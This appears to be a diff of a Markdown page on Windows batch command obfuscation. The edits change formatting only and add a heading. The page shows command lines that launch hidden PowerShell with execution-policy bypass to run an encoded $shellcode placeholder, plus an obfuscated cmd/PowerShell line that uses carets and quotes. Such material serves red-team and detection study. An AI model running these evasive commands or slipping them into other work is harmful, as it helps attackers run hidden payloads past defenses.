@@ -65,7 +65,7 @@ String obfuscated<br />
 
 ---
 
-Any formula under the **batch interpreter** can be started with the follow special characters: **@** or **=** or **,** or **;**
+Any formula under the **batch interpreter** can be started with the follow special characters: **`@`** or **`=`** or **`,`** or **`;`**
 
       =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
@@ -80,8 +80,8 @@ Any formula under the **batch interpreter** can be started with the follow speci
 
       cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
+String obfuscated<br />
 
-      [Using 3 diferent technics (=@|^|")]
       @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
 
 ![last](https://user-images.githubusercontent.com/23490060/94753411-0dfb3500-0386-11eb-9014-2103d88b677e.png)
